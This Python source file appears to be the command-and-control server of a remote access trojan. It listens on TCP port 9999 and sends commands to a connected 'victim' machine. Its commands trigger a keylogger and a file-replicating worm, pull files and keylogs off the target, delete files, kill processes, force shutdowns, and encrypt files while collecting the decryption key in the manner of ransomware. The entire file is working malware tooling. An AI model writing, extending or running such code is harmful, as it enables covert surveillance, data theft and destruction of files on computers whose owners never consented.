import os #need for file operation
import socket #for building tcp connection
import sys
import time
import psutil
import datetime
CHUNK_SIZE = 8 * 1024

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port :" + str(address[1]))
    send_commands(conn)
    conn.close()





# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        command = input(str("Command >> ")) #Get user input and store it in command variable

        if command == 'quit':
            conn.send(command.encode('utf-8'))
            conn.close()
            break


#SYSTEM SHUTDOWN
        elif command == "shutdown" :
            conn.send(command.encode())
            print ('[+] Command sent for execution')
            data=conn.recv(1024)
            if data:
                 print ('[+] Shutdown command has been executed')

#SYSTEM RESTART
        elif command == "restart" :
            conn.send(command.encode())
            print ('[+] Command sent for execution')
            data=conn.recv(1024)
            if data:
                 print ('[+] Restart command has been executed')

#LOCK PC
        elif command == "lock_pc" :
            conn.send(command.encode())
            print ('[+] Command sent for execution')
            data=conn.recv(1024)
            if data:
                 print ('[+] Lock PC command has been executed')

#FILE DUPLICATOR(WORM)
        elif command == "file_rep" :
            conn.send(command.encode())
            print("")
            print ('[+] Command sent for execution')

#KEYLOGGER
        elif command == "keylogger" :
            conn.send(command.encode())
            print("")
            print ('[+] Command sent for execution')
           
#TO VIEW THE VICTIM MACHINE TASK 
        elif command == "view_task":
            conn.send(command.encode())
            with conn, open("newlist.txt", 'wb') as file:
                while True:
                    recvfile = conn.recv(4096)
                    if not recvfile: break
                    file.write(recvfile)
            print("File saved successfully!")

#TO KILL THE TASK
        elif command == "kill_task":
            conn.send(command.encode())
            data = input(str("Please input the PID of the process you want to delete: "))
            conn.send(data.encode())
            print("Process terminated successfully")

        elif command == "view_cwd" :
            conn.send(command.encode())
            print("")
            print ('[+] Command sent for execution')
            print("")
            files = conn.recv(5000)
            files =files.decode()
            print ('[+] Output : ',files)


        elif command == "dir" :
            conn.send(command.encode())
            print("")
            user_input =input(str("Dir : "))
            conn.send(user_input.encode())
            print("")
            print ('[+] Command sent for execution')
            print("")
            files = conn.recv(5000)
            files =files.decode()
            print ('[+] Directory : ',files)


#TO DOWNLOAD FILE FROM VICTIM MACHINE
        elif command == 'download':
            conn.send(command.encode())
            filepath =input(str("[+] Enter the file path and filename:"))
            conn.send(filepath.encode())
            file =conn.recv (1000000)
            filename= input(str("[+] Enter the filename to be saved:"))
            new_file =open(filename, "wb")
            new_file.write(file)
            new_file.close()
            print("")
            print ('[+] Transfer completed ')
            print("")

#TO GET THE KEYLOGS  FILE
        elif command == 'get_log':
            conn.send(command.encode())
            filepath =input(str("[+] Enter the file path and filename:"))
            conn.send(filepath.encode())
            file =conn.recv (100000)
            filename= input(str("[+] Enter the filename to be saved:"))
            new_file =open(filename, "wb")
            new_file.write(file)
            new_file.close()
            print("")
            print ('[+] Transfer completed ')
            print("")

#TO REMOVE FILE 
        elif command == "remove_file":
            conn.send(command.encode())
            file = input(str("[+] Enter the file path: "))
            conn.send(file.encode())
            print(file, "[+] Deleted successfully on victim's machine!")

#TO ENCRYPT THE FILE 
        elif command == "encrypt_file":
            conn.send(command.encode())
            filename = input(str("[+] Enter the name of the file you want to encrypt: "))
            conn.send(filename.encode())
            print("[+] File encrypted successfully")
            file = conn.recv(5000)
            new_file = open('key.key', "wb")
            new_file.write(file)
            new_file.close()
            print("[+] The key for decryption has been downloaded successfully")


#TO DECRYPT THE FILE 
        elif command == "decrypt_file":
            conn.send(command.encode())
            filename = input(str("[+] Enter the name of the file you want to decrypt: "))
            conn.send(filename.encode())
            data = open('key.key', 'rb')
            file_data = data.read(5000)
            conn.send(file_data)
            print("[+] File decrypted successfully")


#TO GET THE CLIENT SYSTEM INFORMARION
        elif command == 'client_info':
            conn.send(command.encode())
            filepath =input(str("[+] Enter the file path and filename:"))
            conn.send(filepath.encode())
            file =conn.recv (100000)
            #filename=("system.txt","w+") 
            new_file =open("system.txt","wb")
            new_file.write(file)
            new_file.close()
            #print(new_file)
            with open('system.txt', 'r') as reader:
           # Read & print the entire file
                print("")
                print(reader.read())
            print("")
            print ('[+] Client information retrieved')
            print("")

#TO  SEND FILE TO VICTIM MACHINE
        elif command == 'send_file':
            conn.send(command.encode())
            file=input(str("[+]Enter the chosen file path and filename:"))
            filename=input(str("[+]Enter the filename to be sent:"))
            data =open(file, "rb")
            file_data = data.read(10000)
            conn.send(filename.encode())
            print("[+]File sent successfully")
            conn.send(file_data)

        else:
           # conn.send(str.encode(command)) #here we will send command to the target
            #client = str(conn.recv(1024).decode("utf-8"))
            #print(client) #print the result we got
    
            print("")
            print("Command not recognised")
def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
